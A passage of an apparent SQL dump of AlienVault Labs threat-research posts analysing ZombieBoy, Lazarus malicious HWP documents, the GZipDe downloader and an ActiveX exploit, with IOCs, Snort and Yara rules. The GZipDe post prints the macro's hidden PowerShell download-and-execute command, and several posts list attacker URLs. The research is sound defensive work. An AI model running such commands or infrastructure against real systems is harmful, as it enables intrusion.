explore how to detect activity like system persistence and many others techniques.Stay tuned!AppendixQueriesselect time, script_text from powershell_events;select processes.name, process_open_sockets.remote_address, process_open_sockets.remote_port from process_open_sockets LEFT JOIN processes ON process_open_sockets.pid = processes.pid WHERE process_open_sockets.remote_port != 0 AND processes.name != \'\';select path, size, from file where path like \'C:\\Users\\%%\' and mtime > (select local_time from time) - 100 and filename != \'.\';select processes.pid, users.username, processes.path from processes LEFT JOIN users ON processes.uid = users.uid WHERE processes.path != \'\';Filesc932d54a9ef3c645a28b7d8de9747fc6c06fc23c6d65c036da4eae4d778a81db     9f6325ebce797b5ceec1bbf32e61aec8fbe8b650       124d03b86227bbf282f0f567ae11858e           bafc6731efd63f57c89653b24ba532ac1e96d259993c8f3d96d26e1cf6cd57d3        DNS requestssamoticha.de  okane-mikata.com      Connections81.169.145.82 112.78.117.29184.186.78.17774.139.102.161OTXhttps://otx.alienvault.com/browse/pulses?q=emotet', 'malwarereverse engineeringosquerymalware analysis', '/blogs/labs-research/malware-analysis-using-osquery-part-1');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (8, 'ZombieBoy', 'James Quinn', 'July 18, 2018 ', 'This is a guest post by independent security researcher James Quinn.Continuing the 2018 trend of cryptomining malware, I’ve found another family of mining malware similar to the “massminer” discovered in early May.  I’m calling this family ZombieBoy since it uses a tool called ZombieBoyTools to drop the first dll.ZombieBoy, like MassMiner, is a cryptomining worm that uses some exploits to spread. However, unlike MassMiner, ZombieBoy uses WinEggDrop instead of MassScan to search for new hosts. ZombieBoy is being continually updated, and I’ve been obtaining new samples almost daily.An overview of ZombieBoy’s execution is below:DomainsZombieBoy uses several servers running HFS (http file server) in order to acquire payloads.  The URLs that I have identified are below:ca[dot]posthash[dot]org:443/sm[dot]posthash[dot]org:443/sm[dot]hashnice[dot]org:443/In addition, it appears to have a C2 server at dns[dot]posthash[dot]org.ExploitsZombieBoy makes use of several exploits during execution:CVE-2017-9073, RDP vulnerability on Windows XP and Windows Server 2003CVE-2017-0143, SMB exploitCVE-2017-0146, SMB exploitInstallationZombieBoy first uses the EternalBlue/DoublePulsar exploits to remotely install the main dll. The program used to install the 2 exploits is called ZombieBoyTools and appears to be of chinese origin. It uses Chinese simplified as its language, and has been used to deploy a number of Chinese malware families (such as the IRONTIGER APT version of Gh0stRAT) . ZombieBoyTools screenshotOnce the DoublePulsar exploit is successfully executed, it loads and executes the first Dll of the malware. This downloads 123.exe from ca[dot]posthash[dot]org:443, saves it to “C:\\%WindowsDirectory%\\sys.exe”, and then executes it.Set up123.exe does several things on execution.  First, it downloads the module [1] from its file distribution servers.  According to code analysis of 123.exe, it refers to this module as “64.exe”, but saves it to the victim as “boy.exe”.   After saving the module, it executes it.  64.exe appears to be in charge of distributing ZombieBoy as well as holding the XMRIG miner.In addition to downloading a module from its servers, 123.exe also drops and executes 2 modules.  The first module is referred to in the code as “74.exe”.  This is saved as “C:\\Program Files(x86)\\svchost.exe. This appears to be a form of the age-old Gh0stRAT. The second module is referred to in the code as “84.exe”.  This is saved as “C:\\Program Files(x86)\\StormII\\mssta.exe” and appears to be a RAT of unknown origin.64.exe64.exe is the first module downloaded by ZombieBoy. 64.exe uses some anti-analysis techniques that are quite formidable.  First, the entire executable is encrypted with the packer Themida, making reverse-engineering difficult.  Also, in current versions of ZombieBoy, it will detect a VM and subsequently not run. 64.exe drops 70+ files into C:\\Windows\\IIS that consists of the XMRIG miner, the exploits, as well as a copy of itself that it names CPUInfo.exe. 64.exe obtains the ip of the victim by connecting to ip[dot]3222[dot]net.  It then uses WinEggDrop, a lightweight TCP scanner to scan the network to find more targets with port 445 open.  It uses the IP obtained above as well as the local IP to spread to the local network as well as the public ip netrange64.exe uses the DoublePulsar exploit to install both a SMB backdoor as well as an RDP backdoor.DoublePulsar screenshotIn addition, 64.exe uses XMRIG to mine for XMR.  Prior to shutting down one of its addresses on minexmr.com, ZombieBoy was mining at around 43KH/s. This would earn the attackers slightly over $1,000 per month at current Monero prices.A new address has been found, however, ZombieBoy no longer uses minexmr.com to mine.Known Addresses:42MiUXx8i49AskDATdAfkUGuBqjCL7oU1g7TsU3XCJg9Maac1mEEdQ2X9vAKqu1pvkFQUuZn2HEzaa5UaUkMMfJHU5N8UCw49vZGV8x3bed3TiAZmNG9zHFXytGz45tJZ3g84rpYtw78J2UQQaCiH6SkozGKHyTV2Lkd7GtsMjurZkk8B9wKJ2uCAKdMLQUsing strace, I found that 64.exe was obtaining information about the victim, such as enumerating the OS architecture.74.exe74.exe is the first module dropped by 123.exe, and the second module overall.  In its base form, 74.exe is in charge of downloading, decrypting, and executing a Gh0stRat dll named NetSyst96.dll.  In addition, 74.exe decrypts a series of arguments to be passed to Netsyst96.dll. The arguments are as follows:Dns.posthash.org127.0.0.15742944442YP_70608ANqiki cmsuucsAamqcygqqeqkiaFngzxzygdgkywoyvkxlpv ldv%ProgramFiles%/Svchost.exeAddEeie saswuk wsoDecryption ScreenshotOnce 74.exe has decrypted the arguments, it checks if NetSyst96.dll has been downloaded and saved to C:\\Program Files\\AppPatch\\mysqld.dll.  It does this by calling CreateFileA with the CreationDisposition set to Open_Existing.  If mysqld.dll is not found, 74.exe opens a connection to ca[dot]posthash[dot]org:443/ and downloads NetSyst96.dll, saving it as C:\\Program Files\\AppPatch\\mysqld.dll.NetSyst96.dll has 2 exported functions, DllFuUpgraddrs, and DllFuUpgraddrs1.  After saving NetSyst96.dll as mysqld.dll, 74.exe locates DllFuUpgraddrs in NetSyst96.dll before calling it.NetSyst96.dllNetSyst96.dll is the called dll of 74.exe.  Typically encrypted, an analysis of the decrypted files returns some interesting strings which can be used to identify it, such as “Game Over Good Luck By Wind”, “jingtisanmenxiachuanxiao.vbs”.Strings screenshot showing some of the dropped filesNetSyst96.dll can capture the users screen, record audio, and even edit the clipboard.  Also, a strings analysis revealed that it imports keyboard keys, typical of a keylogger.  First, Netsyst96.dll obtains the Environment Strings path and uses that to create the path C:\\Program files (x86)\\svchost.exe. Next, using CreateToolhelp32Snapshot, NetSyst96.dll searches the running processes for Rundll32.exe in order to determine if it is the first time running the dll. For first time run throughs, NetSyst96.dll does a couple things to maintain persistenceSaves a copy of 74.exe as C:\\Program Files(x86)\\svchost.exeRegisters “ANqiki cmsuucs” as a service using System/CurrentControlSet/Services/ANqiki cmsuucsWhen the service is launched, runs svchost.exeAdds MARKTIME to the registry key, appending the time it was last launched.Use a snapshot from CreateToolhelp32Snapshot to search the running processes for svchost.exeIf not found, launch it and loop back to searching for svchost.exeIf one is found, Save svchost.exe to RunIf more than one is found, Call a function to create a vbs script to delete the extra svchost.exeOn Consecutive Run throughs, NetSyst96.dll is more concerned with connecting to the C2 server:Locate and verify that “System/CurrentControlSet/Services/ANqiki cmsuucs” existsIf it doesn’t exist, create the key like aboveIf it does exist, continue on to step 2Create event named “Eeie saswuk wso”Enumerate and change the input desktopPass the C2 server Ip to C2URL (dns[dot]posthash[dot]org)Start WSA (winsock 2.0)Connect to www[dot]ip123[dot]com[dot]cn and obtain the ip of dns[dot]posthash[dot]orgThe actual IP is subject to change, however, it currently is 211.23.47[dot]186Reset EventConnect to C2 Server and await commandsWhile the command that triggers this function is unknown, I did uncover a 31 option switch-case that seems to be the command options for NetSyst96.dll.  See the Appendix for more indepth analysis of some of the 31 options.84.exe84.exe is the second module dropped by 123.exe, and the third module overall.  Just like 74.exe, it appears to be a RAT.  However, that is where the similarities stop.  Unlike 74.exe, 84.exe does not need to download any additional libraries and instead decrypts and executes Loader.dll from its own memory.  In addition, 84.exe uses a function to decrypt Loader.dll that involves throwing exceptions for every character that needs to be decrypted. Additional run through information:Sets the user’s environment strings to C:\\Program Files(x86)\\StormII\\In addition, once Loader.dll is called, 84.exe passes a series of variables to Loader.dll through a function called ‘Update’VariablesChDz0PYP8/oOBfMO0A/0B6Y=06gkIBfkS+qY=dazsks fsdgsdfdaac gssosjwayw|_+f+fc45f7f71b30bd66462135d34f3b6c66EQr8/KY=C:\\Program Files(x86)\\StormIIMssta.exe0CcfcdaaVarious integersOf the strings passed to Loader.dll, 3 are encrypted.  The decrypted strings are as follows[ChDz0PYP8/oOBfMO0A/0B6Y=] = \"dns[dot]posthash[dot]org\"[6gkIBfkS+qY=] = \"Default\"[EQr8/KY=] = \"mdzz\"Loader.dllLoader.dll is a RAT with some interesting features, like the ability to search for the CPU write speed, as well as search the system for antiviruses.Launched by 84.exe, the first thing Loader.dll does is obtain the variables from ‘Update’ in 84.exe.  At this point, Loader.dll creates several important runtime objects:Uninheritable, non-signaled, auto-reset event named Null, handle: 0x84Thread to execute a function that manipulates DesktopInfoAn input Desktop with the handle 0x8C and the flag DF_ALLOWOTHERACCOUNTS, which is set as the desktop of the calling thread.Loader.Dll then searches the system for “dazsks fsdgsdf” in SYSTEM/CurrentControlSet/Services/Dazsks Fsdgsdf, which is used to determine if this is the first time running the malware. First Time Run:Loader.dll creates the service Dazsks Fsdgsdf with ImagePath = C:\\Program Files(x86)\\StormII\\mssta.exeLoader.dll attempts to run the newly created service.  If the attempt is successful, continue to main loop.  If not, exit.Consequent run throughs:Start services.exe with the argument Dazsks Fsdgsdf to start the service. Continue to main loop mentioned in First Time RunAfter checking for run through number, Loader.dll enters the main loop of the program. Main loop run through:Creates an uninheritable, auto-reset, nonsignaled event named ‘ccfcdaa’ with a handle of 0x8C. Decrypt ChDz0PYP8/oOBfMO0A/0B6Y= to ‘dns[dot]posthash[dot]org’Start the WinSock objectCreate an uninheritable, unsignaled, manual-reset event object named null with the handle 0x90Assembles Get Request: “Get /?ocid = iefvrt HTTP/1.1”Connects to dns[dot]posthash[dot]org:5200Obtains information about the OS using GetVersionExLoad ntdll.dll and call RtlGetVersionNumbersSaves System\\CurrentControlSet\\Services\\(null) to the registryObtain socket nameObtain the CPU refresh speed using Hardware\\Description\\System\\CentralProcessor\\Calls GetVersion to obtain the system infoCalls GlobalMemoryStatusEx to obtain the status of the available global memoryEnumerate all available disk drives starting at ‘A:/’ using GetDriveTypeAObtain the total amount of free space available on each enumerated driveInitialize the COM libraryAppends the current time to the service ‘dazsks fsdgsdf’ with the marktime functionObtain the system info of a system running under WOW64Using a list of majority chinese AV software filenames and CreateToolHelp32Snapshot, to create a snapshot of running processes and then identify any running AV programs.Decrypt EQr8/KY= to “mdzz”Sends all the data obtained above to the C2 server at dns[dot]posthash[dot]org:5200MitigationThe best way to mitigate being hit by ZombieBoy is as always, avoidance in general, which is why I recommend updating your systems to their most recent update.  Specifically, MS17-010 will fix the malware’s spreading capabilities.If you are infected by ZombieBoy however, the first thing you should do is take a couple deep breaths.  Next, I’d recommend scanning your system with an A/V software of your choice.Once the scan has finished, you should find and end any open processes currently being run by ZombieBoy such as:123.exe64.exe74.exe84.exeCPUinfo.exeN.exeS.exeSvchost.exe (Note the file location.  End any processes not originating from C:\\Windows\\System32)In addition, delete the following registry keys:SYSTEM/CurrentControlSet/Services/Dazsks FsdgsdfSYSTEM/CURRENTCONTROLSET/SERVICES/ANqiki cmsuucAlso, delete any files dropped by the malware such as:C:\\%WindowsDirectory%\\sys.exeC:\\windows\\%system%\\boy.exeC:\\windows\\IIS\\cpuinfo.exeAll of the 70+ files dropped in IISC:\\Program Files(x86)\\svchost.exeC:\\Program Files\\AppPatch\\mysqld.dllC:\\Program Files(x86)\\StormII\\mssta.exeC:\\Program Files(x86)\\StormII\\*Indicators of CompromiseSamplesMD5SizeIPIOCZombieBoy[Main Dll]842133ddc2d57fd0f78491b7ba39a34d82.4kb--123.exe7327ef046fe62a26e5571c36b5c2c417782.3kbDownloaded From:ca.posthash[dot]org:443C:\\%WindowsDirectory%\\sys.exe[Injector123]785a7f6e1cd40b50ad788e5d7d3c8465437.9kb--64.exe79c6ead6fa4f4addd7f2f019716dd6ca 6.4MBMining Server:Minexmr.com Downloaded Fromca.posthash[dot]org:443/sm.posthash[dot]org:443/C:\\windows\\%system%\\boy.exeC:\\windows\\IIS\\cpuinfo.exeNecessary files for exploits and WinEggDrop into C:\\windows\\IIS74.exe 38d7d4f6a712bff4ab212848802f5f9c 9.7kbC2 server:dns.posthash[dot]org:52009/C:\\Program Files(x86)\\svchost.exe SYSTEM/CURRENTCONTROLSET/SERVICES/ANqiki cmsuuc Netsyst96.dll 6de21f2fd11d68b305b5e10d97b3f27e 1.0MBDownloaded Fromca.posthash[dot]org:443/ C2 server:Dns.posthash[dot]org:52009/C:\\Program Files\\AppPatch\\mysqld.dll, 84.exe 91ebe2de7fcb922c794a891ff8987124334.7kb C2 Server:dns.posthash[dot]org:5200/ C:\\Program Files(x86)\\StormII\\mssta.exe SYSTEM/CurrentControlSet/Services/Dazsks Fsdgsdf C:\\Program Files(x86)\\StormII\\* Loader.dll 9a46a3ae2c3762964c5cbb63b62d7dee135.2kbC2 Server:dns.posthash[dot]org:5200/ SYSTEM/CurrentControlSet/Services/(null); Files Queried: Hardware\\Description\\System\\CentralProcessor\\ ;  SYSTEM/CurrentControlSet/Services/BITS;', 'malwaremalware research', '/blogs/labs-research/zombieboy');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (9, 'Malicious Documents from Lazarus Group Targeting South Korea', 'Chris Doman', 'June 22, 2018 ', 'By Chris Doman, Fernando Martinez and Jaime BlascoWe took a brief look at some documents recently discussed and reviewed by researchers in South Korea over the past week. The malware is linked to Lazarus, a reportedly North Korean group of attackers. One malicious document appears to be targeting members of a recent G20 Financial Meeting, seeking coordination of the economic policies between the wealthiest countries. Another is reportedly related to the recent theft of $30 million from the Bithumb crypto-currency exchange in South Korea.This article stands very much on the shoulders of other work by researchers in South Korea. Credit for initially identifying these documents goes to @issuemakerslab, @_jsoo_ and others.Malicious DocumentsWe looked at three similar malicious documents:국제금융체제 실무그룹 회의결과.hwp (\"Results of the international financial system working group meeting\") - cf09201f02f2edb9c555942a2d6b01d4금융안정 컨퍼런스 개최결과.hwp (\"Financial Stability Conference held\") -  69ad5bd4b881d6d1fdb7b19939903e0b신재영 전산담당 경력.hwp (“[Name] Computer Experience”) - 06cfc6cda57fb5b67ee3eb0400dd5b97The decoy document, mentioning the G20 International Financial Architecture Working Group MeetingThe decoy document of a resumeThese are Hangul Word Processor (“HWP”) files - a South Korean document editor. The HWP files contain malicious postscript code to download either a 32 or 64 bit version of the next stage from:https://tpddata[.]com/skins/skin-8.thm - eb6275a24d047e3be05c2b4e5f50703d - 32 bithttps://tpddata[.]com/skins/skin-6.thm - a6d1424e1c33ac7a95eb5b92b923c511 - 64 bitThe malware is Manuscrypt (previously described by McAfee and others), and communicates by impersonating South Korean forum software:These samples communicate with:https://www.anlway[.]com/include/arc.search.class.phphttps://www.apshenyihl[.]com/include/arc.speclist.class.phphttps://www.ap8898[.]com/include/arc.search.class.phpIs this related to the recent Bithumb heist?If you follow cryptocurrency, you may have heard about some thefts reported this month for South Korean cryptocurrency exchanges:Report from the GuardianReports within South Korea have suggested the the thefts from Bithumb started with malicious HWP files earlier in May and June. They also mentioned they are linked to previous attacks by Lazarus, and involved faked resumes.A report by a South Korean news organisation into the investigation by a South Korean security company into the thefts shows some very familiar looking malware samples that were sent to cryptocurrency organisations:Screen-stills from a KBS news reportWhilst we can’t be certain this malware is responsible for the thefts from Bithumb, it seems a likely suspect.Other CampaignsThere were earlier reports of related malicious HWP documents from Lazarus targeting crypto-currency users in South Korea earlier this month. In that case, we noticed there are a number of crypto-currency phishing domains that are registered to the same phone number as a domain (itaddnet[.]com) used to deliver some of the malware.It may be that the attackers are phishing for credentials, in addition to delivering malware:A forum discussion by South Korean crypto-currency users discussing a phishing attack from the domain coinoen[.]orgIt is unusual to see Lazarus registering domains - normally they prefer to compromise legitimate websites. So this would be an unusual attack if it is indeed run by members of Lazarus.Historical AttacksIf the attackers behind the Bithumb heist are indeed Lazarus - they were likely aided by knowledge from a previous hack. They were linked to a theft of $7 million from Bithumb, and other cryptocurrency exchanges, back in 2017:Some selected attacks by different sub-groups of Lazarus, from \"APT Attacks Targeting Financial Institutions\" by Ashley Shen, Kyoung-ju Kwak and Min-Chang JangThese attacks are part of a a large number of attacks against banks, including the attempted theft of $1 billion dollars from the Bank of Bangladesh, attacks against ATM networks. They are also well known for the WannaCry and Sony Pictures attacks.It’s clear that the thefts from Lazarus won’t stop anytime soon given the gains available - the (partially successful) attempt to steal $1 billion dollars from the Bank of Bangladesh represents 3% of North Korea’s reported GDP. Thefts from South Korean organisations have the double impact of weakening their closest competitor.Just earlier this month, there were reports that Lazarus stole $10 million dollars from a Chilean bank - and destroyed thousands of computers in the process of covering their tracks.AppendixAdditional indicators are available in our OTX Pulse.  File-Hashes596fbdf01557c3ec89b345c57ae5d9a0b7251dd8d5a707f7353dd733274c6eb6                                 58a97c2c731cdf045f26ccc7cba370bd2dfee277a9c43c0421c53593e493f7bc                               485f77e5d32de5dc05510743025a75af5b6f714e930e22098490b7afb71b737fe498630abe9a91485ba42698a35c2a0d8e13fe5cccde65479bf3033c45e7d431                                4838f85499e3c68415010d4f19e83e2c9e3f2302290138abe79c380754f973242813c0ebcacdcf9052f71d51c81e9c52a16b9a69f8981b2c74eab236524ff4b92f4a958b148bef4be10780e8128860cdca21ec26537f51cec8960a9e019aa1f04838f85499e3c68415010d4f19e83e2c9e3f2302290138abe79c380754f973245b1663d5eb565caccca188b6ff8a36291da32f368211e6437db339ce2dc2e9cd7985af0a87780d27dc52c4f73c38de44e5ad477cb78b2e8e89708168fbc4a882afba8105793b635d4ed7febdae4b744826ca8b2381c1b85f5e528bb672ed63c2c10363059c57c52501c01f85e3bb43533ccc639f0ea57f43bae5736a8e7a9bc8d8af45210bf931bc5b03215ed30fb731e067e91f25eda02a404bd55169e3e3c3e98991cdd9ddd30adf490673c67a4f8241993f26810da09b52d8748c6160a292927120588e6c4e5db5b5a1ea9914cd78a0fa0c9fb558726604747de672c6adf3e76b3fd3e906ac23218b1fbd66fd29c3945ee209a29e9462bbc46b07d1645de23cde54dce88a4544bf5ffa36066a184958d4ff74c2e0ce32fdbf91729c0f574e Domainstpddata[.]comitaddnet[.]comwifispeedcheck[.]net Potentially related phishing domains:coinoen[.]org                          coinmaketcape[.]combitfiniex[.]org URLshttps://www.apshenyihl[.]com/include/arc.speclist.class.php                                   https://www.ap8898[.]com/include/arc.search.class.php                              https://www.anlway[.]com/include/arc.search.class.php                              https://tpddata[.]com/skins/skin-8.thm                                   https://tpddata[.]com/skins/skin-6.thmhttp://168wangpi[.]com/include/charset.phphttp://ando.co[.]kr/service/s_top.asphttp://ansetech.co[.]kr/smarteditor/common.asphttp://mileage.krb.co[.]kr/common/db_conf.asphttp://www.028xmz[.]com/include/common.phphttp://www.33cow[.]com/include/control.phphttp://www.51up[.]com/ace/main.asphttp://www.530hr[.]com/data/common.phphttp://www.97nb[.]net/include/arc.sglistview.phphttp://www.anlway[.]com/include/arc.search.class.phphttp://www.ap8898[.]com/include/arc.search.class.phphttp://www.apshenyihl[.]com/include/arc.speclist.class.phphttp://www.marmarademo[.]com/include/extend.phphttp://www.paulkaren[.]com/synthpop/main.asphttp://www.shieldonline.co[.]za/sitemap.asp Network DetectionETPRO TROJAN Win32/Agent.WTE HTTP CnC BeaconETPRO TROJAN Win32/Agent.WTE/Manuscrypt HTTP CnC Beacon', 'malwaremalware researchlazarusmalicious documents', '/blogs/labs-research/malicious-documents-from-lazarus-group-targeting-south-korea');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (10, 'GZipDe: An Encrypted Downloader Serving Metasploit', 'Jose Manuel Martin', 'June 20, 2018 ', 'At the end of May a Middle Eastern news network published an article about the next Shanghai Cooperation Organization Summit. A week ago, AlienVault Labs detected a new malicious document targeting the area. It uses a piece of text taken from the report as a decoy:This is the first step of a multistage infection in which several servers and artifacts are involved. Although the final goal seems to be the installation of a Metasploit backdoor, we found an interesting .NET downloader which uses a custom encryption method to obfuscate process memory and evade antivirus detection.Malicious DocumentThe file, which was uploaded to VirusTotal by a user in Afghanistan, contains macro malware embedded in a MS Office Word document (.doc).  When opened, it executes a Visual Basic script stored as a hexadecimal stream, and executes a new task in a hidden Powershell console:\'C:\\Windows\\System32\\schtasks.exe\' /Create /sc MINUTE /MO 1 /TN WindowsUpdate /TR \'Powershell -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\\\\\'http://118.193.251[.]137/dropbox/?p=BT67HU78HZ\\\\\\\',\\\\\\\'$env:public\\svchost325.vbs\\\\\\\');(New-Object -com Shell.Application).ShellExecute(\\\\\\\'$env:public\\svchost325.vbs\\\\\\\');\' /FLeveraging an HTTP request, it resolves to the following URL:http://118.193.251[.]137/dropbox/?p=BT67HU78HZWe are missing the next step of the infection chain as the server is now offline.Based on the common path we believe this file is related, and may be part of the later infection steps: http://118.193.251[.]137/dropbox/filesfhjdfkjsjdkfjsdkfjsdfjksdfjsdkfasdfjnadsfjnasdnj/utorrent.exe.GZipDe - The Encrypted DownloaderThe internal name of this malware is Gzipde, as specified by the path it was built on the attacker’s machine:\\Documents\\Visual Studio 2008\\Projects\\gzipde\\gzipde\\obj\\Debug\\gzipde.pdbWe found the original reverse-tcp payload publicly available on GitHub, although the attacker added an additional layer of encryption payload to that version. It consists of a Base64 string, named GZipDe, which is zip-compressed and custom-encrypted with a symmetric key algorithm, likely to avoid antivirus detection.The key is described as an array of bytes, with the values:After decompression, it passes through a decryptor. The encryption method used is RC4 with a key length of 23 bytes.The malware allocates a new memory page with execute, read and write privileges. Then it copies the contents of the decrypted payload and launches a new thread to execute it.The script uses WaitForSingleObject C# class, meaning that the program accesses a mutex object. A special handler controls the access of the process to system resources. This prevents multiple instances of the same malware to run at a time, unnecessarily increasing resource  usage and producing more network noise.The payload contains shellcode that contacts the server at 175.194.42[.]8. Whilst the server isn’t up, Shodan recorded it serving a Metasploit payload:Metasploit is becoming a popular choice with targeted attacks.The Metasploit payloadThe server, 175.194.42[.]8, delivers a Metasploit payload. It contains shellcode to bypass system detection (since it looks to have a valid DOS header) and a Meterpreter payload - a capable backdoor. For example, it can gather information from the system and contact the command and control server to receive further commands.This shellcode loads the entire DLL into memory, so it’s able to operate while writing no information into the disk. This operation is called Reflective DLL injection. From this point, the attacker can transmit any other payload in order to acquire elevated privileges and move within the local network.Thanks to Chris Doman and Jaime Blasco for collaboration.AppendixFile-Hasheshttps://otx.alienvault.com/indicator/file/faf003c38758cf70b12bc4899714833e4713096c8f66163e753b3f0e70f2ba28\n IP Addresses118.193.251[.]137175.194.42[.]8URLshttp://118.193.251[.]137/dropbox/filesfhjdfkjsjdkfjsdkfjsdfjksdfjsdkfasdfjnadsfjnasdnj/utorrent.exehttp://118.193.251[.]137/dropbox/?p=BT67HU78HZNetwork DetectionMulti-purpose:AV ATTACK_RESPONSE Metasploit Reverse Shell Verification (Echo)ET ATTACK_RESPONSE Metasploit/Meterpreter - Sending metsrv.dll to Compromised HostET ATTACK_RESPONSE Metasploit Meterpreter Reverse HTTPS certificateDedicated:alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"AV TROJAN GZipDe MacroMalware CnC Checkin\"; flow:established,to_server; content:\"/dropbox/?p=\"; http_uri; depth:12; content:!\"User-Agent|3a| \"; http_header; content:!\"Referer\"; http_header; pcre:\"^/\\/dropbox\\/\\?p=[a-zA-Z0-9]*$/U\"; reference:md5,951d9f3320da660593930d3425a9271b; classtype:trojan-activity; sid:xxx; rev:1;)alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"AV TROJAN GZipDe MacroMalware Payload Request\"; flow:established,to_server; content:\"/dropbox/file\"; depth:13; http_uri; content:\".exe\"; http_uri; distance:0; isdataat:!1,relative; content:!\"User-Agent|3a| \"; http_header; content:!\"Referer\"; http_header; reference:md5,951d9f3320da660593930d3425a9271b; classtype:trojan-activity; sid:xxx; rev:1;)Unified Security Management (USM) Correlation RulesSystem Compromise - Code Execution - Powershell Process Created by Office WordDelivery & Attack - Suspicious Download - File Download via Office MacroEnvironmental Awareness - Code Execution - Suspicious PowerShell ArgumentsOTX Pulse  Yara Rulerule gzipde_hunt {\n\n    meta:\n\n        author = \"AlienVault Labs\"\n\n        description = \"Hunt rule to identify files related to Gzipde\"\n\n        copyright = \"Alienvault Inc. 2018\"\n\n        reference = \"https://otx.alienvault.com/pulse/5b239254174e5d5edab34e05\"\n\n  strings:\n\n    $a = \"118.193.251.137\" nocase wide ascii\n\n    $b = \"BT67HU78HZ\" nocase wide ascii\n\n    $c = \"2E0EB747-BE46-441A-A8B1-97AB27B49EC5\" nocase wide ascii\n\n    $d = \"gzipde.pdb\" nocase wide ascii\n\n    $e = \"C:\\\\Users\\\\jhon\\\\Documents\\\\Visual Studio 2008\" nocase wide ascii\n\n  condition:\n\n    any of them\n\n}\n\n\nimport \"dotnet\"\n\nrule MeterpreterEncryptedPayloadDotNetGzipDE {\n\n            meta:\n\n                        type = \"malware\"\n\n                        description = \"GZipDe\"\n\n                        author = \"[email protected]\"\n\n                        reference1 = \"https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp/blob/master/NativePayload_Reverse_tcp.cs\"\n\n                        reference2= \"https://otx.alienvault.com/indicator/file/33c03d94f75698fac6a39a5a6c328c2be4a079717520e0ec411597b9ca3a9bef\"\n\n            strings:\n\n                        $pdb = \"gzipde.pdb\"\n\n                        $st1 = \"PAGE_EXECUTE_READWRITE\"\n\n                        $st2 = \"EncryptInitalize\"\n\n                        $st3 = \"EncryptOutput\"\n\n                        $st4 = \"CreateThread\"\n\n                        $st5 = \"VirtualAlloc\"\n\n            condition:\n\n                        uint16(0) == 0x5A4D and\n\n                        ((dotnet.typelib == \"c1181bc0-0102-44e9-82ba-7c1ca7d24219\" and\n\n                        dotnet.guids[0] == \"2e0eb747-be46-441a-a8b1-97ab27b49ec5\") or\n\n                        $pdb or\n\n                        (dotnet.number_of_modulerefs == 1 and\n\n                        dotnet.modulerefs[0] == \"kernel32\" and\n\n                        all of ($st*)))\n\n}', 'malware researchmetasploitgzipde', '/blogs/labs-research/gzipde-an-encrypted-downloader-serving-metasploit');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (11, 'More Details on an ActiveX Vulnerability Recently Used to Target Users in South Korea', 'Chris Doman', 'June 11, 2018 ', 'Written By Chris Doman and Jaime BlascoIntroductionRecently, an ActiveX zero-day was discovered on the website of a South Korea think tank that focuses on national security. Whilst ActiveX controls are disabled on most systems, they are still enabled on most South Korean machines due to mandates by the South Korean government. These attacks have been attributed to Lazarus, a group thought to be linked to North Korea.Below we’ve shared our brief analysis of of the attack.Profiling ScriptThe first step appears to have been a profiling script to get information on possible targets for their attack. We’ve seen Lazarus do this before on other sites they have infected, and it’s a technique that other advanced attackers have been seen to employ.This was followed by scripts to perform additional profiling and actually delivery the ActiveX exploit.Some details of these scripts were kindly shared by issuemakerslab, who identified a number of infections that moved over time:Whilst these malicious files have been taken down, a record of the same infection is preserved on urlscan. The malicious script is hidden at http://www.sejong[.]org/js/jquery-1.5.3.min.js.This script is similar to typical exploit kits - it identifies which browser and operating system the user is running. Much of the code is taken from PinLady’s Plugin-Detect. If a target is running Internet Explorer, it checks if it is enabled to run ActiveX, and what plugins are enabled from a specific list of ActiveX components:EasyPayPlugin.EPplugin.ACUBEFILECTRL.AcubeFileCtrlCtrl.1DUZONERPSSO.DUZONERPSSOCtrl.1Results are sent to http://alphap1[.]com/hdd/images/image.php?id=ksjdnks. An example execution URL stored in OTX is:http://alphap1.com/hdd/images/image.php?id=ksjdnks&w=c2Vqb25n&r=PD89JHJlZmVyZXI/Pg==&o=V2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgU0xDQzI7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy41LjMwNzI5OyAuTkVUIENMUiAzLjAuMzA3Mjk7IE1lZGlhIENlbnRlciBQQyA2LjA7IC5ORVQ0LjBDOyAuTkVUNC4wRTsgcnY6MTEuMA==&lv=KO&bt=-1&bv=&bdv=undefined&fv=MjksMCwwLDE3MQ==&silv=NSwxLDUwOTA3LDA=&ez=false&ac=false&si=false&du=false&iw=false  Other Profiling ScriptsIt’s easy to find other similar looking scripts with the same obfuscation techniques.One sends results to http://aega.co[.]kr/mall/skin/skin.php?id=ksjdnksIt’s possible this site was compromised some time ago, as it’s a recorded as a command and control server for related Lazarus malware back in 2015 named Waketagat.ActiveX Exploit and DeliveryThe ActiveX exploit was also shared by issumakerslabs on Twitter:Javascript to execute the ActiveX exploitVBScript written to temp.vbs to download and install the malware (splwow32.exe)If successful, it downloads malware from: http://www.peaceind[.]co.kr/board/skin_poll/gallery/poll.phpTo a file named splwow32.exe. Splwow32.exe is a fairly uncommon filename for malware, and was previously seen in the Taiwan bank heist which has been attributed to another sub-set of the Lazarus attackers. We also note that the peaceind[.]co.kr site has been previously identified as vulnerable.The MalwareWhilst we can’t be certain, based on the rare filename, date and context the delivered malware is likely this file. The malware, detected as Akdoor.R228914 by Ahnlab, is a simple backdoor that executes commands over the command prompt. It has a distinctive command and control protocol.When the malware communication is decoded, the victim machine sends a status such as:And the server responds with:We were able to find two other samples of Akdoor.R228914 and a different C&C that we share in the appendix.AppendixYara rulesrule ActiveXSejongInstitute {\n\n        strings:\n\n                $a1 = \"EasyPayPlugin.EPplugin.1\"\n\n                $a2 = \"ACUBEFILECTRL.AcubeFileCtrlCtrl.1\"\n\n                $a3 = \"DUZONERPSSO.DUZONERPSSOCtrl.1\"\n\n                $a4 = 